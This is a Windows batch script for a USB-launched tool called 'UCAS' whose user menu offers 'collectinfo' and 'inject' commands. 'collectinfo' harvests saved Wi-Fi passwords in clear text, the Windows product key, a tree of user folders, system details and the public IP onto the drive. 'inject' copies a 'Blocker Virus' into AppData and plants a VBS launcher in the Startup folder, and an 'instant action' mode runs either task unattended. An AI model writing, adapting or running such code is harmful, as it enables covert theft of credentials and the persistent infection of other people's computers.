@echo off
	::Plan
	:: 1-help 2-settings 3-install 4-uninstall 5-register 6-login
	
	
	:variable_declaration
	set narrator_sound=
	set character_found=false
	set text_available=true
	set allowed_char_list=ABCDEFGHIJKLMNOPRSTUVYZWXQabcdefghijklmnoprstuvyzwxq0123456789-_
	
	:compile_1
	title UCAS Prompt 1.0
	mode con: cols=90 lines=30
	color 0f
	setlocal enabledelayedexpansion
	set skip_help=false
	set skip_1=true
	set masterkey=7b6c2-a190mn-o47y28-uiu12-15uu9-bh09i-tr115-nbrt1-jaq88-qw45t
	
	

	:setpath
	set program_path=%0
	set program_directory=!program_path:~1,-10!
	set program_drive=!program_directory:~0,2!
	set usb=%program_drive%
	
	

	
	:compile_2
	!usb!
	
	
	if not exist UCAS_FILES (
	:setupfiles
	echo.
	call :colormsg 0b " Setting Up The Program"
	echo.
	echo.
	echo  Some files are missing in your UCAS directory
	echo  You can not proceed without them
	echo.
	echo  Do you agree to create files?[Y/N]
	echo.
	call :colormsg 08 " setupmode"
	call :colormsg 0f "@"
	call :colormsg 0a "user"
	call :colormsg 0f "[]-"
	set /p choice=
	call :usberror
	
	
	if !choice!==N (
	exit
	)
	
	if !choice!==Y (
	mkdir UCAS_FILES
	cls
	goto :compile_3
	)
	
	
	call :usberror
	call :badinput setupfiles
	
	)
	::compile_2
	
	

	
	:compile_3
	
	cd UCAS_FILES
	call :scan_for_files
	:file_check_report
	
		if !file_check_error!==true (
		cls
		echo.
		call :colormsg 0b " File does not exist"
		echo.
		call :colormsg 0f " Currently missing is" 
		call :colormsg 0c " !missing_file!"
		echo.
		echo.
		echo  Please import the file into the UCAS_FILES folder.
		echo  If it is missing, redownload it from GitHub.
		echo.
		echo  [1-Continue]
		echo  [2-Exit]
		echo.
		call :colormsg 08 " setupmode"
		call :colormsg 0f "@"
		call :colormsg 0a "user"
		call :colormsg 0f "[]-"
		set /p choice=
		call :usberror
		
			if !choice!==2 exit
			
			if !choice!==1 (
			set choice=
			call :scan_for_files
			goto :file_check_report
			)
		call :usberror
		call :badinput file_check_report
		)else (
		cls
		set choice=
		goto :skip_2
		)
		:skip_2
	


		:compile_4
		call :troubleshoot_data
		call :scan_for_masterdatabase
		
		
		
		if !data_check_error!==true (
		
		
		cls
		echo.
		call :colormsg 0b " Finishing Setup"
		echo.
		call :colormsg 0f " Missing file is "
		call :colormsg 0c " !missing_file!
		echo.
		echo.
		echo  Do you agree to create database files?[Y/N]
		echo.
		call :colormsg 08 " setupmode"
		call :colormsg 0f "@"
		call :colormsg 0a "user"
		call :colormsg 0f "[]-"
		set /p choice=
		call :usberror
		
		
			if !choice!==N exit
			
			if !choice!==Y (
		
			
			call :setup_database
			call :setup_users
			
			

			
			
			
			
			goto :skip_3
			)
		
		
		
		
		
		
		
		
		call :usberror
		call :badinput compile_4
		)
		:skip_3
		::compile_4
	
	
	
	
	
	
	
	

	
	
	
	
	
	
	
	
	
	
	
	
	
	
	:setupvariables
	echo.
	call :colormsg 0b " Reading Data"
	echo.
	echo.
	echo  Please wait...
	call :decrypt "database.uext" "database.dll"
	timeout /t 1 /nobreak >nul
	call :decrypt "users.uext" "users.dll"
	timeout /t 1 /nobreak >nul
	for /f "tokens=1-2" %%a in ( database.dll ) do (
	set %%a=%%b
	)

	call :encrypt "database.dll" "database.uext"
	timeout /t 1 /nobreak >nul
	call :encrypt "users.dll" "users.uext"
	timeout /t 1 /nobreak >nul
	
	
	if !instant_action!==on cls & goto :instant_action
	
	


	
	
	
	
	:mainmenu
	call :troubleshoot_data
	call :usberror
	set choice=
	cls
	echo.
	call :colormsg 0b " Main Menu"
	echo.
	echo.
	echo  [======================================================================================]
	echo              ____
	echo             //  \\          _________________
	echo            []    []        [  _____________  ]
	echo            []    []        [ [             ] ]
	echo           _[]____[]_       [ [             ] ]            UCAS Version 2.0
	echo          /    __    \      [ [_____________] ]      Developed By TechnicalUserX
	echo         [    /  \    ]     [_________________]
	echo         [    \  /    ]     \\----------------\\
	echo         [     []     ]      \\----------------\\
	echo         [            ]       \\________________\\
	echo          \__________/         \__________________\
	echo.  
	echo  [======================================================================================]
	call :colormsg 0b "                            Powered by Windows Command Prompt               "
	echo.
	echo  [======================================================================================]
	echo.
	
	set skip_1=false
	



	
	call :input mainmenu
	call :usberror
	if "!choice!"=="exit" exit
	if !choice!==help cls & goto :help
	if !choice!==register cls & goto :register
	if !choice!==login cls & goto :login
	if !choice!==logout cls & goto :logout
	if !choice!==mainmenu cls & goto :mainmenu
	if !choice!==controlmysystem cls & goto :master_control_menu
	call :troubleshoot_data
	call :badinput mainmenu
	
	



	

	
	
	
	
	

	
	
	
	
	:register
	call :troubleshoot_data
	call :user_count
		if !login_block!==true (
		echo.
		call :colormsg 0e " Account numbers has reached to the limit
		timeout /t 3 >nul
		cls
		goto :mainmenu
		)
	cls
	echo.

	call :colormsg 0b " Register"
	echo.
	echo.
	call :colormsg 0e " Your new username - "
	set /p newuser=
	echo.
	call :colormsg 0e " Your new password - "
	set /P newpass=
	echo.
	call :colormsg 0e " Confirm your password - "
	set /p newpassconfirm=
	call :usberror
	
	call :character_finder "!newuser!" " "
	if !character_found!==true (
		cls
		set character_found=false
		echo.
		call :colormsg 0c " Username can not contain blank space"
		timeout /t 2 >nul
		call :register_remove_var
		cls
		call :usberror
		goto :mainmenu
	)
	
	if "!newpass!"=="!newpassconfirm!" (
		call :character_finder "!newpass!" " "
		if !character_found!==true (
		cls
		set character_found=false
		echo.
		call :colormsg 0c " Password can not contain blank space"
		timeout /t 2 >nul
		cls
		call :usberror
		goto :mainmenu
	)
	
		call :create_string pass_check "!newpass!"
		if !pass_check_length! lss 8 (
		cls
		echo.
		call :colormsg 0c " Password cant be shorter than 8 characters"
		timeout /t 2 >nul
		cls
		call :usberror
		goto :mainmenu
		)
	
		cls
		call :usberror
		echo.
		call :colormsg 0b " Register"
		echo.
		echo.

		
		call :colormsg 0e " Adjusting some settings before use of UCAS
		echo.
		echo  Please wait...
		call :usberror
		timeout /t 3 /nobreak >nul

		
		
		
			call :id_generator
			call :user_generator "!newuser!" "!newpass!"
		
		
		
		
		
		

		echo.
		call :colormsg 0f " Database["
		call :colormsg 0a "ok"
		call :colormsg 0f "]"
		echo.
		echo.
		echo  Press any key to return main menu...
		call :register_remove_var
		pause >nul
		
	
		call :usberror
		cls
		goto :mainmenu
	
	)else (
	cls
	echo.
	call :colormsg 0c " Password didnt match"
	echo.
	timeout /t 2 >nul
	call :register_remove_var
	cls
	call :usberror
	goto :mainmenu
	)
	
	call :usberror
	cls
	goto :mainmenu
	
	

	
	
	:settings
	call :troubleshoot_data
	set choice=
	cls
	echo.
	call :colormsg 0b " Settings"
	echo.
	echo.
	echo  Change feature settings of UCAS
	echo.
	

	call :colormsg 0f " [1-Instant Action]-[
	call :colormsg 0b "!instant_action!"
	call :colormsg 0f "]"
	echo.
	echo.
	echo  [2-Go to user menu]                      
	echo.
	
	::Main Menu Screen
	
	
	call :input settings
	call :usberror
		
	
		
		if !choice!==2 cls & goto :usermenu
		
		
		if !choice!==1 (
		cls
		

		
		echo.
		call :colormsg 0f " Instant Action [
		call :colormsg 0b "!instant_action!"
		call :colormsg 0f "]"
		echo.
		call :colormsg 0f " Predefined Method ["
		call :colormsg 0b "!instant_action_predefined_method!"
		call :colormsg 0f "]"
		echo.
		echo.
		echo  [1-On]
		echo  [2-Off]
		echo  [3-Set Method]
		echo  [4-Go to settings]
		echo.
		call :input settings
		call :usberror
		
		if !choice!==3 (
		cls
		echo.
		echo  Method List
		echo.
		call :colormsg 0f " 1-"
		call :colormsg 0e "collectinfo"
		echo.
		call :colormsg 0f " 2-"
		call :colormsg 0e "inject"
		echo.
		call :colormsg 0f " 3-"
		call :colormsg 0e "none" 
		echo.
		
		call :input settings
		call :usberror
				
				if !choice!==1 (
				call :change_dll_var instant_action_predefined_method collectinfo
				set instant_action_predefined_method=collectinfo
				set choice=
				cls
				goto :settings
				)
				if !choice!==2 (
				call :change_dll_var instant_action_predefined_method inject
				set instant_action_predefined_method=inject
				set choice=
				cls
				goto :settings
				)
				if !choice!==3 (
				call :change_dll_var instant_action_predefined_method none
				set instant_action_predefined_method=none
				set choice=
				cls
				goto :settings
				)
		
		
		
		call :badinput settings
		)
		
		
		
		
		
		
		
		if !choice!==1 (
			if !instant_action!==on (
			cls
			echo.
			call :colormsg 0c " Service is already on"
			echo.
			echo.
			echo  Press any key to return settings...
			pause >nul
			cls
			set choice=
			goto :settings
			)
		set instant_action=on
		set choice=
		call :change_dll_var instant_action on
		goto :settings
		)
		
		if !choice!==2 (
			if !instant_action!==off (
			cls
			echo.
			call :colormsg 0c " Service is already off"
			echo.
			echo.
			echo  Press any key to return settings...
			pause >nul
			cls
			set choice=
			goto :settings
			)
		set instant_action=off
		set choice=
		call :change_dll_var instant_action off
		goto :settings
		)
		
		if !choice!==4 (
		cls
		set choice=
		goto :settings
		)
		
		call :badinput settings
		
		)
		
	
		call :badinput settings
		)
		::option_1
	
	
	
	
	call :badinput settings
	
	::settings end
	

	
	
	:change_dll_var
	call :decrypt "database.uext" "database.dll"
	for /f "tokens=1-2" %%a in ( database.dll ) do (
	if %%a==%1 (
	echo %%a %2>>database_raw.dll
	)else (
	echo %%a %%b>>database_raw.dll
	)
	)
	del database.dll
	ren database_raw.dll database.dll
	call :encrypt "database.dll" "database.uext"
	goto :eof
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	:usberror
	goto :eof
	
	

	
	:help
	call :troubleshoot_data
	cls
	echo.
	if !skip_help!==true goto :skip_help
	set skip_help=true
	:skip_help
	call :colormsg 0b " [Commands]"
	echo.
	echo.
	echo  Main Menu Functions
	echo.
	echo  - help              Opens help page
	echo  - login             Logins with your account
	echo  - register          Creates an account  
	echo.
	echo  User Menu Functions
	echo.
	echo  - delete            Deletes account
	echo  - collectinfo       Collects various informations from target PC
	echo  - settings          Sets variables
	echo  - logoff            Logoff current user
	echo  - inject            Injects the blocker virus to current user
	echo  - mainmenu          Returns to main menu
	echo.
	echo  Press any key to turn back main menu...
	pause >nul
	set choice=
	cls
	call :usberror
	goto :mainmenu
	
	

	
	:register_remove_var
	set newuser=
	set newpass=
	set newpassconfirm=
	goto :eof
	
	
	
	
	
	:badinput
	call :colormsg 0c " Unknown command"
	timeout /t 3 >nul
	set choice=
	cls
	goto :%1
	
	

	
	
	:input
	call :colormsg 08 " %privilege_level%"
	call :colormsg 0f "@"
	call :colormsg 0a "%who_am_i%"
	call :colormsg 0f "[]-"
	set /p choice=
	call :usberror
	if "!choice!"=="" (
	set choice=
	call :colormsg 0c " Unknown command"
	timeout /t 3 >nul
	cls
	goto :%1
	)
	goto :eof
	
	
	
	

	
	
	
	:colormsg
	call "!program_directory!\UCAS_FILES\colorchar.exe" /%1 %2
	goto :eof
	
	

	
	
	:create_string
	set /a takeaway=4
	set string=%2
	echo %string%>var.txt
	for /f "useback tokens=*" %%a in ( '%string%' ) do (
	if %string%==%%~a (
	set /a takeaway=2
	)
	set string=%%~a 
	)
	set %1=%string%
	for %%I in ( var.txt ) do (
	set /a %1_length=%%~zI - %takeaway%
	)
	del var.txt
	goto :eof
	
	
	
	:character_finder
	set character_found=false
	call :create_string string_find "%~1"
	set /a string_find_length=!string_find_length! - 1
	for /l %%a in ( 0, 1, !string_find_length! ) do (
		set character=!string_find:~%%a,1!
		if "!character!"=="%~2" (
		set character_found=true
		)
	)
	goto :eof
	

	
	
	:user_generator
	:: call id_generator "!username!" "!password!"
	call :decrypt "users.uext" "users.dll"
	
	for /f "tokens=1-3" %%a in ( users.dll ) do (
	
	if "%~1"=="%%a" (
		echo.
		call :colormsg 0c " A problem occured"
		echo.
		call :colormsg 0c " This username already exists
		call :register_remove_var
		timeout /t 3 /nobreak >nul
		cls
		call :usberror
		goto :mainmenu
		) 
	)
	echo %~1 %~2 !user_id!>>users.dll
	call :encrypt "users.dll" "users.uext"
	goto :eof
	

	
	:id_generator
	set user_id=!random!-!random!-!random!-!random!-!random!
	goto :eof
	
	

	
	:login
	if !who_am_i! neq user (
		cls
		set choice=
		goto :usermenu
	)
	call :troubleshoot_data
	echo.
	call :colormsg 0b " Login"
	echo.
	echo.
	call :colormsg 0e " Username - "
	set /p enteruser=
	echo.
	echo.
	call :colormsg 0e " Password - "
	set /p enterpass=
	echo.
	echo.
		call :decrypt "users.uext" "users.dll"
		for /f "tokens=1-2" %%a in ( users.dll ) do (
		set checkpass=%%b
		
		if "%%a"=="!enteruser!" (
	
			if "!enterpass!"=="!checkpass!" (
			cls
			set enterpass=
			set user=!enteruser!
			set checkpass=
			call :change_dll_var who_am_i !enteruser!
			set who_am_i=!enteruser!
			set enteruser=
			call :encrypt "users.dll" "users.uext"
			goto :usermenu
			
			)else (
			call :colormsg 0c " Username or password is incorrect"
			timeout /t 3 >nul
			call :encrypt "users.dll" "users.uext"
			cls
			set enteruser=
			set enterpass=
			set checkpass=
			
			
			goto :mainmenu
			)
		
		
		)
		
	)
	call :colormsg 0c " Username or password is incorrect"
	timeout /t 3 >nul
	cls
	call :encrypt "users.dll" "users.uext"
	set enteruser=
	set enterpass=
	set checkpass=
	goto :mainmenu
	
	

	
	
	:usermenu
	call :troubleshoot_data
	call :usberror
	set choice=
	cls
	echo.
	call :colormsg 0b " User Menu"
	echo.
	echo.
	echo  [======================================================================================]
	echo                                 ________    ________
	echo                                /      __\__/__      \
	echo                               [      /        \      ]
	echo                               {     [          ]     }
	echo                               [     {          }     ]
	echo                                \    [          ]    /
	echo                                 \____\        /____/
	echo                             ____/     \______/     \____
	echo                            /      ____/      \____      \
	echo                           [______/                \______]
	echo                                 [__________________]
	echo  [======================================================================================]
	call :colormsg 0b "                         Powered By Windows Command Prompt"
	echo.
	echo  [======================================================================================]
	call :colormsg 08 "   Welcome "
	call :colormsg 0a " !who_am_i!
	echo.
	echo  [======================================================================================]
	echo.
	call :input usermenu
	call :usberror

		if !choice!==mainmenu cls & goto :mainmenu
	
		if !choice!==settings (
		cls
		goto :settings
		)
		
		if !choice!==inject cls & goto :inject
		

		if !choice!==collectinfo (
		set choice=
		call :pick_info
		cls
		goto :usermenu
		)
	

	
	
	


		if !choice!==logoff (
		cls
		set choice=
		call :logoff
		)
	
	
	
	
	
		if !choice!==delete (
		
		:delete_account
		cls
		echo.
		call :colormsg 0b " Delete Account"
		echo.
		echo.
		echo  Are you sure to delete your account?[Y/N]
		echo.
		echo  [Note: This will not delete collected informations]
		echo.
		call :input delete_account
		call :usberror
		
			
			
			
			if !choice!==N (
			cls
			set choice=
			goto :usermenu
			)
		
			
			
			
			
			if !choice!==Y (
			call :decrypt "users.uext" "users.dll"
			echo Users of this program>users_raw.dll
				
			for /f "tokens=1-3" %%a in ( users.dll ) do (
				
			call :delete_user_function "%%a" "%%b" "%%c"
			)
			del users.dll
			ren users_raw.dll users.dll
			call :encrypt "users.dll" "users.uext"
			call :change_dll_var who_am_i user
			set who_am_i=user
			set privilege_level=standart
			call :colormsg 0e " Delete Complete"
			set choice=
			timeout /t 3 >nul
			cls
			goto :mainmenu
			)
		
			set choice=
			call :badinput delete_account
			)
	
		
	set choice=
	call :badinput usermenu

	)
	
	
	
	
	

	
	
	
	:encrypt
	call crypto_ucas.exe -e !masterkey! %~1 %~2
	del %~1
	goto :eof
	
	
	
	
	
	:decrypt
	call crypto_ucas.exe -d !masterkey! %~1 %~2
	del %~1
	goto :eof
	
	
	
	
	
	
	
	
	
	
		
	:scan_for_files
	set missing_file=
	set file_check_error=false
	
	if not exist crypto_ucas.exe (
	set missing_file=crypto_ucas.exe
	set file_check_error=true
	goto :eof
	)
	

	
	if not exist bv.bat (
	set missing_file=bv.bat
	set file_check_error=true
	goto :eof
	)
	
	if not exist bv_chk.bat (
	set missing_file=bv_chk.bat
	set file_check_error=true
	goto :eof
	)
	
	if not exist srun.vbs (
	set missing_file=srun.vbs
	set file_check_error=true
	goto :eof
	)
	
	goto :eof


	:scan_for_masterdatabase
	set data_check_error=false
		
	if not exist database.uext (
	set missing_file=database.uext
	set data_check_error=true
	goto :eof
	)
	
		
	if not exist users.uext (
	set missing_file=users.uext
	set data_check_error=true
	goto :eof
	)
	goto :eof
	
	
	
	
	
	:user_count
	set login_block=false
	set /a user_index=-1
	set /a user_limit=1
		call :decrypt "users.uext" "users.dll"
			
			for /f "tokens=1" %%a in ( users.dll ) do (
			
			
				set /a user_index=!user_index!+1
			
				if "!user_index!"=="!user_limit!" (
				set login_block=true
				set user_index=
				set /a current_user_number=!user_limit!
				goto :eof
				)
			
			)
	
		call :encrypt "users.dll" "users.uext"
	goto :eof
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	:troubleshoot_data
	if exist users.dll (
	call :encrypt "users.dll" "users.uext"
	)
	if exist database.dll (
	call :encrypt "database.dll" "database.uext"
	)
	goto :eof
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	:pick_info
	if not exist "!program_directory!\UCAS_FILES\COLLECTED_DATA" mkdir "!program_directory!\UCAS_FILES\COLLECTED_DATA"
 		
		for /l %%a in ( 1, 1, 1000 ) do (
			
			if not exist "!program_directory!\UCAS_FILES\COLLECTED_DATA\DATA_%%a" (
			mkdir "!program_directory!\UCAS_FILES\COLLECTED_DATA\DATA_%%a"
			set folderindex=%%a
			goto :skip_data_folder_create
		)
		)
		:skip_data_folder_create
		!systemdrive!
		
		echo  Collecting WI-FI Interfaces...
		echo.
		for /f "tokens=5 skip=9" %%a in ( 'netsh wlan show profiles' ) do (
		netsh wlan show profiles %%a key=clear>>"!program_directory!\UCAS_FILES\COLLECTED_DATA\DATA_!folderindex!\saved_network_info.txt"
		)
		echo  Collecting Local IP Info...
		echo.
		ipconfig /all>"!program_directory!\UCAS_FILES\COLLECTED_DATA\DATA_!folderindex!\localipinfo.txt"
		echo  Reading Windows Product Key...
		wmic path softwarelicensingservice get oa3xoriginalproductkey>"!program_directory!\UCAS_FILES\COLLECTED_DATA\DATA_!folderindex!\productkey.txt"
		echo.
		echo  Collecting System Tree Scheme...
		echo  Current System Drive is !systemdrive!
		tree  !systemdrive!\Users /f /a>>"!program_directory!\UCAS_FILES\COLLECTED_DATA\DATA_!folderindex!\tree.txt"
		echo.
		echo  Getting Public IP...
		powershell.exe Invoke-RestMethod -Uri "http://ipinfo.io">"!program_directory!\UCAS_FILES\COLLECTED_DATA\DATA_!folderindex!\publicipinfo.txt"
		echo.
		echo  Collecting System Info...
		systeminfo>>"!program_directory!\UCAS_FILES\COLLECTED_DATA\DATA_!folderindex!\systeminfo.txt"
		!usb!
		cd..
		timeout /t 1 /nobreak >nul
	goto :eof

	
	
	
	
	
	
	
	
	
	:logoff
	set choice=
	echo.
	call :colormsg 0b " Logoff"
	echo.
	echo.
	echo  Are you sure to logoff?[Y/N]
	echo.
	echo.
	call :input logoff

		if !choice!==N (
		cls
		set choice=
		goto :usermenu
		) 
		if !choice!==Y (
		call :change_dll_var who_am_i user
		set privilege_level=standart
		cls
		set choice=
		set who_am_i=user
		goto :mainmenu
		)
	call :badinput logoff

	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	:delete_user_function
	if "%~1"=="Users" goto :skip_delete
	if "!who_am_i!"=="%~1" goto :skip_delete
	echo %~1 %~2 %~3>>users_raw.dll
	:skip_delete
	goto :eof
	
	
	
	
	
	
	
	
	
	

	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	

	
	
	
	
	
	
	
	:master_control_menu
	echo.
	call :colormsg 0b " Master Control Menu"
	echo.
	echo.
	echo  [1-Decrypt users file]
	echo.
	echo  [2-Encrypt users file]
	echo.
	echo  [3-Decrypt database file]
	echo.
	echo  [4-Encrypt database file]
	echo.
	echo  [5-Main Menu]
	echo.
	echo  [6-Reset Admin Password]
	echo.
	echo  [7-View Users Information]
	echo.
	echo  [8-View Database]
	echo.
	echo  [9-Decrypt bv_chk]
	echo.
	echo  [10-Encrypt bv_chk]
	echo.
	echo  [11-Decrypt bv]
	echo.
	echo  [12-Encrypt bv]
	echo.
	call :input master_control_menu
	
	if !choice!==11 (
	call :decrypt "bv.uext" "bv.bat"
	set choice=
	cls
	goto :master_control_menu
	)
	if !choice!==12 (
	call :encrypt "bv.bat" "bv.uext"
	set choice=
	cls
	goto :master_control_menu
	)
	
	
	
	if !choice!==9 (
	call :decrypt "bv_chk.uext" "bv_chk.bat"
	set choice=
	cls
	goto :master_control_menu
	)
	if !choice!==10 (
	call :encrypt "bv_chk.bat" "bv_chk.uext"
	set choice=
	cls
	goto :master_control_menu
	)
	
	
	
	if !choice!==1 (
	call :decrypt "users.uext" "users.dll"
	cls
	set choice=
	goto :master_control_menu
	)
	
	if !choice!==2 (
	call :encrypt "users.dll" "users.uext"
	cls
	set choice=
	goto :master_control_menu
	)
	
	if !choice!==3 (
	call :decrypt "database.uext" "database.dll"
	cls
	set choice=
	goto :master_control_menu
	)
	
	if !choice!==4 (
	call :encrypt "database.dll" "database.uext"
	cls
	set choice=
	goto :master_control_menu
	)
	
	if !choice!==5 (
	cls
	set choice=
	goto :mainmenu
	)
	
	if !choice!==6 (
	call :change_dll_var admin_password none
	set admin_password=none
	set choice=
	cls
	goto :master_control_menu
	
	)
	
	if !choice!==7 (
	echo.
	call :decrypt "users.uext" "users.txt"
	type users.txt
	call :encrypt "users.txt" "users.uext"
	set choice=
	pause
	cls
	goto master_control_menu
	
	)
	
	if !choice!==8 (
	echo.
	call :decrypt "database.uext" "database.txt"
	type database.txt
	call :encrypt "database.txt" "database.uext"
	pause
	set choice=
	cls
	goto master_control_menu
	
	)
	
	
	set choice=
	call :badinput master_control_menu
	goto :eof
	
	
	
	
	:change_image
	reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  "" /f
	RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
	goto :eof
	
	
	
	
	
	:setup_database
			if exist database.uext (
			goto :skip_create_database
			)
			echo who_am_i user>>database.dll
			echo admin_password none>>database.dll
			echo narrator_sound on>>database.dll
			echo privilege_level standart>>database.dll
			echo destroyer_mode off>>database.dll
			call :encrypt "database.dll" "database.uext"
	:skip_create_database
	
	goto :eof
	
	
	
	
	:setup_users
	if exist users.uext goto :skip_create_users
	echo Users of this program>>users.dll
	call :encrypt "users.dll" "users.uext"
	
	:skip_create_users
	goto :eof
	
	
	
	

	
	:instant_action
	if !instant_action_predefined_method!==collectinfo (
	mode con: cols=50 lines=10
	cls
	echo.
	echo  Predefined Method "collectinfo"...
	call :change_dll_var instant_action_predefined_method none
	call :change_dll_var instant_action off
	call :pick_info
	echo  Task Successful>"!program_directory!\ucas_task_report.txt"
	echo  Performed: collectinfo>>"!program_directory!\ucas_task_report.txt
	echo  !date!>>"!program_directory!\ucas_task_report.txt
	exit
	)
	if !instant_action_predefined_method!==inject (
	mode con: cols=50 lines=10
	cls
	echo.
	echo  Predefined Method "inject"...
	call :change_dll_var instant_action_predefined_method none
	call :change_dll_var instant_action off
	echo  Copying files...
	copy "!program_directory!\UCAS_FILES\bv_chk.bat" "!appdata!"
	copy "!program_directory!\UCAS_FILES\bv.bat" "!appdata!"
	copy "!program_directory!\UCAS_FILES\colorchar.exe" "!appdata!"
	copy "!program_directory!\UCAS_FILES\srun.vbs" "!appdata!\Microsoft\Windows\^Start Menu\Programs\Startup"
	echo  Task Successful>"!program_directory!\ucas_task_report.txt"
	echo  Performed: inject>>"!program_directory!\ucas_task_report.txt
	echo  !date!>>"!program_directory!\ucas_task_report.txt
	exit
	)	
	
	goto :eof
	
	
	
	:inject
	cls
	color 4f
	echo.
	call :colormsg 44 "-"
	call :colormsg cf " Batch Injection - Blocker Virus"
	echo.
	echo.
	echo  [=========================================================================]
	echo          _________      ____________
	echo         /         \  __/            \__
	echo        ^|  __   __  ^|/                  \_____
	echo        ^| ^|__^| ^|__^| ^|     ________              Blocker Virus
	echo         \         /_____/        \            Developed By TechincalUserX
	echo          ^|_______^|____            \________
	echo            ^|^|^|^|^|       \___
	echo            _____
	echo.
	echo  [=========================================================================]
	echo   Are you sure to inject?[Y/N]
	echo  [=========================================================================]
	call :colormsg 48 " !privilege_level!"
	call :colormsg 4f "@"
	call :colormsg 4a "!who_am_i!
	call :colormsg 4f "[]-"
	set /p choice=
	if "!choice!"=="" (
	cls
	goto :inject
	)
	if "!choice!" == "Y" (
	echo  Copying files...
	copy "!program_directory!\UCAS_FILES\bv_chk.bat" "!appdata!"
	copy "!program_directory!\UCAS_FILES\bv.bat" "!appdata!"
	copy "!program_directory!\UCAS_FILES\colorchar.exe" "!appdata!"
	copy "!program_directory!\UCAS_FILES\srun.vbs" "!appdata!\Microsoft\Windows\^Start Menu\Programs\Startup"
	call :colormsg 44 "-"
	call :colormsg 4a " Completed"
	echo.
	timeout /t 3 >nul
	cls
	color 0f
	goto :usermenu
	)
	if "!choice!" == "N" (
	cls
	color 0f
	goto :usermenu
	)
	
	call :badinput inject
	
	
	
	
	
